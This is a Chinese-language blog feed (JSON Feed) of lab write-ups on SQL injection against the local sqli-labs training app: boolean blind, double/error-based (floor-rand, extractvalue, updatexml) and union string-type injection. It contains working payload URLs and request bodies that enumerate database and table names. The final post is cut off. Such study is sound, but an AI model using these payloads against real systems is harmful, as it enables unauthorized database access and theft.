{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden • All posts by \"sql注入探究\" category",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/",
            "title": "布尔盲注",
            "date_published": "2022-09-30T17:41:34.000Z",
            "content_html": "<h1 id=\"sql-注入之布尔盲注\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之布尔盲注\">#</a> SQL 注入之布尔盲注</h1>\n<p>本篇使用布尔盲注。</p>\n<p><code>注意</code> ：盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。</p>\n<p><strong>布尔盲注</strong></p>\n<p><strong>原理：</strong><br>\n注入的时候只会返回 <code>True和False</code> ，所以布尔盲注就是根据页面显示的是 <code>True还是False</code>  进行猜测数据库中的信息。</p>\n<p>布尔盲注需要几个函数的辅助，就先来了解一下这几个函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">length()函数可返回字符串的长度</span><br><span class=\"line\">substring()函数可以截取字符串，可指定开始的位置和截取的长度</span><br><span class=\"line\">ord()函数可以返回单个字符的ASCII码</span><br><span class=\"line\">char()函数可将ASCII码转换为对应的字符</span><br></pre></td></tr></table></figure>\n<p>具体的用法可以参考大佬的博客<a href=\"https://www.jianshu.com/p/f0174ea6c69d\"> Mysql 语法介绍</a>，接下来就通过<strong> sql-labs</strong> 练习布尔盲注。</p>\n<p><strong>判断注入点</strong>（也就是闭合符号）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p>发现输入 <code>id=1'</code>  没有错误回显</p>\n<p><img src=\"image-20221001005755289.png\" alt=\"image-20221001005755289\"></p>\n<p>在 <code>id=1'</code>  后再加上<strong>注释符号</strong>后又回显正确，所以判定闭合符号为 <code>'</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001005844512.png\" alt=\"image-20221001005844512\"></p>\n<p><strong>爆数据库长度</strong></p>\n<p>由于我们知道  <code>select uname = 'id' and 1 from xxxx</code>  在 id 有效的情况下，加入 <code>and 1</code>  不会影响整体判断</p>\n<p>那么，这里的 1 可以被任何的查询正确的 <code>布尔型判断语句</code> 返回结果所替代，比如 <code>length(database()) =x </code> 就可以来代替 1 这个值。</p>\n<p>只有当 x 等于正确的数据库长度时，才能使 <code>and 1 成立</code> ，才能使整个查询语句回显正确的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=1 --+</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=2 --+</span><br><span class=\"line\">.....</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001010826646.png\" alt=\"image-20221001010826646\"></p>\n<p><img src=\"image-20221001010848025.png\" alt=\"image-20221001010848025\"></p>\n<p>手工注入的话就要一遍一遍的试试，将后面的长度不断增大，最后得出数据库名的长度为 <code>8</code></p>\n<p><strong>爆数据库名</strong><br>\n知道了数据库名的长度，接下来就来爆破数据库名</p>\n<p><strong>以这一句为基础</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and 1 --+</span><br></pre></td></tr></table></figure>\n<p>继续深入构造爆破查询语句：</p>\n<h3 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h3>\n<p>布尔盲注爆破数据库名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and ascii(substr(database(),1,1))=1 --+</span><br></pre></td></tr></table></figure>\n<p>然后交给<strong> BurpSuit</strong> 抓包，选择<strong> Send to Intruder</strong></p>\n<h4 id=\"清空变量\"><a class=\"markdownIt-Anchor\" href=\"#清空变量\">#</a> 清空变量</h4>\n<p><img src=\"image-20221001011237616.png\" alt=\"image-20221001011237616\"></p>\n<h4 id=\"设置爆破变量\"><a class=\"markdownIt-Anchor\" href=\"#设置爆破变量\">#</a> 设置爆破变量</h4>\n<p>首先我们确定好</p>\n<p>ascii(substr(database(), <code>1</code> ,1))= <code>1</code>  --+ 这一句中，我标识出来的两个位置【需要我们使用工具<strong>爆破</strong>】。</p>\n<p>使用 Add$ 来为想要爆破的变量添加上变量符号</p>\n<p><img src=\"image-20221001011541978.png\" alt=\"image-20221001011541978\"></p>\n<h4 id=\"选择爆破取值范围\"><a class=\"markdownIt-Anchor\" href=\"#选择爆破取值范围\">#</a> 选择爆破取值范围</h4>\n<p>第一个位置， ascii (substr (database (), <code>1</code> ,1))=1</p>\n<p><img src=\"image-20221001011859324.png\" alt=\"image-20221001011859324\"></p>\n<p>第二个位置， ascii (substr (database (),1,1))= <code>1</code></p>\n<p><img src=\"image-20221001012047075.png\" alt=\"image-20221001012047075\"></p>\n<h4 id=\"开始爆破\"><a class=\"markdownIt-Anchor\" href=\"#开始爆破\">#</a> 开始爆破</h4>\n<p><img src=\"image-20221001012115998.png\" alt=\"image-20221001012115998\"></p>\n<p>由于我们的包总长度 <code>根据回显内容不同而发生变化</code> ，因此，只有<strong>当取值正确的时候包长度会跟其他错误的情况不一样</strong>，看下图有 8 个情况和其他次数有不一样的结果。</p>\n<p><img src=\"image-20221001012215106.png\" alt=\"image-20221001012215106\"></p>\n<table>\n<thead>\n<tr>\n<th>payload1 (数据库名第 n 个字符)</th>\n<th>payload2 (数据库名第 n 个字符是什么字符)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>115–&gt;‘s’</td>\n</tr>\n<tr>\n<td>2</td>\n<td>101–&gt;‘e’</td>\n</tr>\n<tr>\n<td>3</td>\n<td>99  --&gt;‘c’</td>\n</tr>\n<tr>\n<td>4</td>\n<td>117–&gt;‘u’</td>\n</tr>\n<tr>\n<td>5</td>\n<td>114–&gt;‘r’</td>\n</tr>\n<tr>\n<td>6</td>\n<td>105–&gt;‘i’</td>\n</tr>\n<tr>\n<td>7</td>\n<td>116–&gt;‘t’</td>\n</tr>\n<tr>\n<td>8</td>\n<td>121–&gt;‘y’</td>\n</tr>\n</tbody>\n</table>\n<p>综上，数据库名是 <code>security</code></p>\n<p>爆破表名，同理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limint 0,1),1,1))=1 --+</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/",
            "title": "双注入",
            "date_published": "2022-09-30T16:08:18.000Z",
            "content_html": "<h1 id=\"sql-注入之双注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之双注入\">#</a> SQL 注入之双注入</h1>\n<p>本篇使用双注入。</p>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"设置代理\"><a class=\"markdownIt-Anchor\" href=\"#设置代理\">#</a> 设置代理</h3>\n<p>还是 Less-11，我们挂上<strong> BurpSuit</strong> 代理，然后<strong> Send To Reapeater</strong>。</p>\n<p><img src=\"image-20220930220638714.png\" alt=\"image-20220930220638714\"></p>\n<h3 id=\"确定注入类型和列数\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型和列数\">#</a> 确定注入类型和列数</h3>\n<p>我们输入 1 + 单引号。 <strong>不报错</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221056886.png\" alt=\"image-20220930221056886\"></p>\n<p>输入 1 + 单引号 + %23</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27;&quot; %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>报错， <code>&quot; #' and password='123456' LIMIT 0,1</code> 。</p>\n<p>由 #号后面跟着个单引号，这就说明第一个<strong> username 是使用单引号闭合的</strong>。</p>\n<p><img src=\"image-20220930221013645.png\" alt=\"image-20220930221013645\"></p>\n<p>使用 order by n 确定列数</p>\n<p>输入 2，不报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; order by 2 %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221434509.png\" alt=\"image-20220930221434509\"></p>\n<p>输入 3，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; order by 3 %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221557671.png\" alt=\"image-20220930221557671\"></p>\n<p>综上，注入类型是<strong> POST 型单引号注入</strong>，且<strong>查询列数为 2</strong>。</p>\n<p>采用双注入时，我们需要使用到以下函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">group by 函数：在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；</span><br><span class=\"line\"></span><br><span class=\"line\">floor()函数：MySQL的一个数学函数。此函数用于查找等于或小于给定数字的最大整数。</span><br><span class=\"line\">Select floor(11.2); ----&gt;返回11（注意，只返回11，因为11是小于11.2的最大整数）</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\">|   floor(11.2)  |</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\">|           11   |</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\"></span><br><span class=\"line\">rand()函数：获取随机的浮点数（小于0的小数），而 rand(0) 则是获取固定的小数值</span><br><span class=\"line\">举例说明：select rand() from qs_ad_category;</span><br><span class=\"line\">结果为随机的浮点型小数：0.7450851357961866</span><br><span class=\"line\"></span><br><span class=\"line\">floor() 函数 配合 rand() 函数</span><br><span class=\"line\">由于rand()函数是获取小于1 的浮点数，也就是例如上述结果中的0.7450851357961866</span><br><span class=\"line\">而floor()函数是将括号中的值取整，以小于括号中值的最大整数作为结果展示出来。</span><br><span class=\"line\">例如上述rand()的结果为 0.7450851357961866，那么最大整数就是 “0” 所以 ：</span><br><span class=\"line\">select floor(rand(0)) from qs_ad_category 的 结果值 为 “0” 。</span><br><span class=\"line\">若是rand()*2,则 rand() 结果可能会大于 1 ，那么结合 floor()函数 ——最终的值可能为0，可能为1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">count() 函数：计数函数，用来计算数据总和的函数，该函数结果集只有一个。</span><br><span class=\"line\">count(1)：统计不为NULL 的记录。</span><br><span class=\"line\">count(*)：统计所有的记录（包括NULL）</span><br><span class=\"line\">count(字段)：统计该&quot;字段&quot;不为NULL 的记录。</span><br><span class=\"line\">count(DISTINCT 字段)：统计该&quot;字段&quot;去重且不为NULL 的记录。</span><br><span class=\"line\"></span><br><span class=\"line\">如果三者一起使用:</span><br><span class=\"line\">select 1,count(1) from information_schema.tables group by floor(rand(0)*2)</span><br><span class=\"line\">意思是，floor(rand(0)*2)这个值存在的话 count()加1，若虛表不存在记录，插入虚表时会把floor(rand(0)*2)再执行一次（注意是一次，很重要！！！）</span><br></pre></td></tr></table></figure>\n<p>使用 group by floor (rand () *2)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,2 from information_schema.tables group by floor(rand()*2) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930223216903.png\" alt=\"image-20220930223216903\"></p>\n<p>可以看到，uname 和 password 位都被 select 的内容（1 和 2）代替。</p>\n<p>下面探究 group by、rand ()、count () 的组合使用的关系。</p>\n<h3 id=\"灵魂拷问一rand和rand0有什么区别\"><a class=\"markdownIt-Anchor\" href=\"#灵魂拷问一rand和rand0有什么区别\">#</a> 灵魂拷问一：rand () 和 rand (0) 有什么区别？</h3>\n<p>使用 <code>rand() *2</code> ， <code>第一次</code> 。</p>\n<p><img src=\"image-20220930225234750.png\" alt=\"image-20220930225234750\"></p>\n<p>使用 <code>rand() *2</code> ， <code>第二次</code> 。</p>\n<p><img src=\"image-20220930225215910.png\" alt=\"image-20220930225215910\"></p>\n<p>使用 <code>rand() *2</code> ， <code>第三次</code> 。</p>\n<p><img src=\"image-20220930225250214.png\" alt=\"image-20220930225250214\"></p>\n<p>综合以上三次使用 rand ()*2 的情况，我们发现结果毫无规律，是真正的随机。</p>\n<p>使用 <code>rand(0) *2</code> ， <code>第一次</code> 、 <code>第二次</code> 、 <code>第三次</code> 都是下图：</p>\n<p><img src=\"image-20220930225429894.png\" alt=\"image-20220930225429894\"></p>\n<p>结果说明，使用 rand (0)*2 可以做到一种伪随机变化，会一直保持 011 011 011 这样的规律。</p>\n<h3 id=\"灵魂拷问二为什么select-1-count1-from-xxx-group-by-floorrand0-2-会报错\"><a class=\"markdownIt-Anchor\" href=\"#灵魂拷问二为什么select-1-count1-from-xxx-group-by-floorrand0-2-会报错\">#</a> 灵魂拷问二：为什么 select 1, count (1) from xxx group by floor (rand (0) * 2) 会报错？</h3>\n<p>我们需要知道先创建虚拟表，以下图 (其中 key 是 group by 后面跟随的内容【即主键】，不可重复)</p>\n<p><img src=\"image-20220930230206868.png\" alt=\"image-20220930230206868\"></p>\n<p>开始查询数据，取数据库数据，而后查看虚拟表中是否存在主键，不存在则插入新记录，存在则 count (1) 字段直接加 1，</p>\n<p><img src=\"image-20220930230334615.png\" alt=\"image-20220930230334615\"></p>\n<p>由此看到 若是 key 存在的话就 + 1， 不存在的话就新建一个 key。</p>\n<p>但是 mysql 官方有给提示，查询的时候若是使用了 rand () 的话，该值会被计算屡次，这个【计算屡次】是什么意思？就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，若是虚表不存在这个记录，插入虚表的时候会再被执行一次。</p>\n<p>由前文可知，floor (rand (0)*2) 的值是 011011011… 的规律。</p>\n<p>取第一条记录，取到的值是 0【 <code>第一次计算</code> 】。</p>\n<p><code>判断</code> ：虚表中发现 0 这个键值并不存在，那么，floor (rand (0)*2) 会被再次计算一次</p>\n<p>结果取到了 1【 <code>第二次计算</code> 】。将 key=1 插入虚表，这是第一条记录查询完毕。</p>\n<p><img src=\"image-20220930231052670.png\" alt=\"image-20220930231052670\"></p>\n<p>查询第二次记录，再次计算 floor (rand (0)*2)，发现结果为 1【 <code>第三次计算</code> 】。</p>\n<p>查询虚表，发现 1 这个键值已经存在，因此 floor (rand (0)*2) 不会再次计算，直接 count (1) 加 1，第二条记录查询完毕。</p>\n<p><img src=\"image-20220930231458853.png\" alt=\"image-20220930231458853\"></p>\n<p>查询第三条记录，再次计算 floor (rand (0)*2)，取值为 0【 <code>第四次计算</code> 】，查询虚表，发现键值没有 0，则再次计算 floor，取值为 1【 <code>第五次计算</code> 】</p>\n<p>而此时，1 这个主键已经存在于虚表中，新计算的值也为 1【 <code>第五次计算</code> 】，<strong>由于插入的 key 主键值必须唯一</strong>，新计算的 1 和主键 1 重复，因此插入的时候直接报错。</p>\n<h3 id=\"灵魂拷问三选择rand0而非rand的原因\"><a class=\"markdownIt-Anchor\" href=\"#灵魂拷问三选择rand0而非rand的原因\">#</a> 灵魂拷问三：选择 rand (0) 而非 rand () 的原因</h3>\n<p>简而言之，group by 插入进 &lt;key，count (1)&gt; 虚表的前提是 —— <code>当前的记录在虚表中不存在</code> 。</p>\n<p>白话文解释：当前的记录由于 011011011 这特殊规律导致 0 这个记录的在表中不存在，计算时总是被取值成 1 插入虚表，第一次还能插进来，但在第二次新插入进来的 1 又存在于虚表中，所以就报 “重复条目 “的错了。</p>\n<p>选择 <code>rand(0)x2</code>  是<strong>必会报错</strong>，而 <code>rand()x2</code>  就不一定了【可能报错、可能不报错】。</p>\n<p>因为通过上文解释，如果不是 011011 这个特殊规律，0 和 1 是都可以进到虚表中，如果都能进来，那就不会报错。</p>\n<p>因此，100% 报错须要 count ()，rand (0)*2、group by，三者缺一不可。</p>\n<h3 id=\"双注入走起\"><a class=\"markdownIt-Anchor\" href=\"#双注入走起\">#</a> 双注入走起</h3>\n<p>首先使用 concat 组合字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), version()) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001000024436.png\" alt=\"image-20221001000024436\"></p>\n<p>将 version 处替换成我们想要的 select 语句【注意，这里只能使用 limit 0,1 来进行输出爆破，group_concat 会爆出数据库信息失败】</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), (select table_name from information_schema.tables where table_schema=database() limit 0,1)) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001000515293.png\" alt=\"image-20221001000515293\"></p>\n<p>至此，双注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "title": "报错注入",
            "date_published": "2022-09-29T15:57:38.000Z",
            "content_html": "<h1 id=\"sql-注入之报错注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之报错注入\">#</a> SQL 注入之报错注入</h1>\n<p>本篇使用报错注入。</p>\n<p><code>注意</code> ：报错函数的使用中，第二个参数如果来自于查询语句，都是<strong>需要用小括号包裹起来的</strong>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#使用 extractvalue(1, (select xxx))</span><br><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(&#x27;%&#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;passwd=123456&amp;submit=Submit</span><br><span class=\"line\"></span><br><span class=\"line\">#使用 updatexml(1, (select xxx), 1)</span><br><span class=\"line\">uname=1&#x27; union select 1, updatexml(1, concat(&#x27;%&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"设置代理\"><a class=\"markdownIt-Anchor\" href=\"#设置代理\">#</a> 设置代理</h3>\n<p>还是 Less-11，我们挂上<strong> BurpSuit</strong> 代理，然后<strong> Send To Reapeater</strong>。</p>\n<p><img src=\"image-20220929231322659.png\" alt=\"image-20220929231322659\"></p>\n<p>报错注入常使用的函数如下：</p>\n<p>①<strong>extractvalue</strong> (): 从目标 XML 中返回包含所查询值的字符串。</p>\n<p>例子：extractvalue (XML_document, XPath_string);</p>\n<p><code>第一个参数</code> ：XML_documentshi String 格式，为 XML 文档对象的名称。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<p><code>第二个参数</code> ：XPath_string (Xpath 格式的字符串)。<strong>在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。</strong></p>\n<p>concat ()：返回结果为连接参数产生的字符串。</p>\n<p>②<strong>updatexml</strong> (): 更新 XML 信息</p>\n<p>例子：updatexml (XML_document, XPath_string, new_value);</p>\n<p><code>第一个参数</code> ：XML_document 是 String 格式，为 XML 文档对象的名称。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<p><code>第二个参数</code> ：XPath_string (XPATH 格式的字符串)。<strong>在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。</strong></p>\n<p><code>第三个参数</code> ：new_value, String 格式， 替换查找到的符合条件的数据。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<h3 id=\"确定注入类型和列数\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型和列数\">#</a> 确定注入类型和列数</h3>\n<p>通过单引号注入和 order by n 来<strong>确定注入类型</strong>和<strong>查询列数</strong>。</p>\n<p><img src=\"image-20220929232026560.png\" alt=\"image-20220929232026560\"></p>\n<h3 id=\"使用指定报错函数\"><a class=\"markdownIt-Anchor\" href=\"#使用指定报错函数\">#</a> 使用指定报错函数</h3>\n<p>那么我们就可构造：</p>\n<p>extractvalue (1, XPATH_string)，其中 XPATH_string 为 (select version ())</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, (select version())) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929233031785.png\" alt=\"image-20220929233031785\"></p>\n<p>可以看到版本号被截断，信息不全。我们尝试调 concat () 函数使用 0x7e 字符拼接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(0x7e, (select version()))) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929233343167.png\" alt=\"image-20220929233343167\"></p>\n<p>这里分割字符串可以换成 %，分割字符串的选择比较看运气，有时候后台会校验，所以多用 ASCII 来表示。<strong>比如波浪线的 ASCII 为 0x7e</strong></p>\n<p><img src=\"image-20220929233647634.png\" alt=\"image-20220929233647634\"></p>\n<h3 id=\"泄露数据库信息\"><a class=\"markdownIt-Anchor\" href=\"#泄露数据库信息\">#</a> 泄露数据库信息</h3>\n<p>准备泄露数据库的表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(&#x27;%&#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>但是报了错， <code>Subquery returns more than 1 row</code> ，说明最后查询的 select 的列数超过了一列。</p>\n<p><img src=\"image-20220929233914430.png\" alt=\"image-20220929233914430\"></p>\n<p>我们需要<strong>使用 limit 0,1 限制一列输出</strong></p>\n<p><img src=\"image-20220929234118900.png\" alt=\"image-20220929234118900\"></p>\n<p>或者<strong>使用 group_concat 拼接成一列</strong></p>\n<p><img src=\"image-20220929234238245.png\" alt=\"image-20220929234238245\"></p>\n<p>同理，也使用 updatexml 进行报错注入</p>\n<p>构造时，因为我们关键是为了调用 <code>updatexml</code>  函数和使用 <code>第二个参数</code> 进行内容输出，因此<strong>第一个参数</strong>和<strong>第三个参数</strong>都是 **“无用”** 的，设置成 1 即可。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; union select 1, updatexml(1, concat(&#x27;</span><span class=\"operator\">%</span><span class=\"string\">&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929234443551.png\" alt=\"image-20220929234443551\"></p>\n<p>至此，报错注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "字符型注入",
            "date_published": "2022-09-29T13:54:18.000Z",
            "content_html": "<h1 id=\"sql-注入之字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之字符型注入\">#</a> SQL 注入之字符型注入</h1>\n<p>本篇使用字符型注入。</p>\n<h2 id=\"注入步骤单引号注入\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤单引号注入\">#</a> 注入步骤 (单引号注入)</h2>\n<p>由于 Less-1 从请求上看到是 GET 型，所以礼节性地输入个 id=1</p>\n<p><img src=\"image-20220929215708949.png\" alt=\"image-20220929215708949\"></p>\n<h3 id=\"尝试注入类型\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929215814839.png\" alt=\"image-20220929215814839\"></p>\n<p>输入 22’  来看看是否报错</p>\n<p><img src=\"image-20220929215843779.png\" alt=\"image-20220929215843779\"></p>\n<p>那么， <code>'22'' LIMIT 0,1</code>  中，‘22’’  外面包裹的两个单引号是查询时带上的，需要我们去闭合。</p>\n<h3 id=\"确定注入类型\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型\">#</a> 确定注入类型</h3>\n<p>闭合单引号，需要在输入中添加一个单引号之后，使用行注释符注释后面的代码，常用的有: #、%23、–+</p>\n<p>那么，我们尝试一下 #号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; #</span></span><br></pre></td></tr></table></figure>\n<p>不行，会报错，可能后台过滤了 #号。</p>\n<p><img src=\"image-20220929220358319.png\" alt=\"image-20220929220358319\"></p>\n<p>尝试 %23 也一样，就不再贴图了。</p>\n<p>我们最后尝试–+，成功。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220326957.png\" alt=\"image-20220929220326957\"></p>\n<p>由此，可以确定此题注入类型为字符型注入的<strong>单引号注入</strong>。</p>\n<h3 id=\"确定列数\"><a class=\"markdownIt-Anchor\" href=\"#确定列数\">#</a> 确定列数</h3>\n<p>使用 order by n 来确定有多少列。<strong>order by n</strong> 会以当前表中的 “<strong>第 n 列</strong>” 进行排序，如果<strong>第 n 列不存在</strong>，则会抛出 <code>Unknown column 'n' </code> 的异常。</p>\n<p>4 列？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220842238.png\" alt=\"image-20220929220842238\"></p>\n<p>3 列？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220533059.png\" alt=\"image-20220929220533059\"></p>\n<p>不报错，则说明 <code>有3列</code> 。</p>\n<h3 id=\"构造联合查询泄露数据库信息\"><a class=\"markdownIt-Anchor\" href=\"#构造联合查询泄露数据库信息\">#</a> 构造联合查询泄露数据库信息</h3>\n<p>这回我们使用 <code>and 0</code>  来构造对于 id 的查询为假的条件</p>\n<figure class=\"highlight 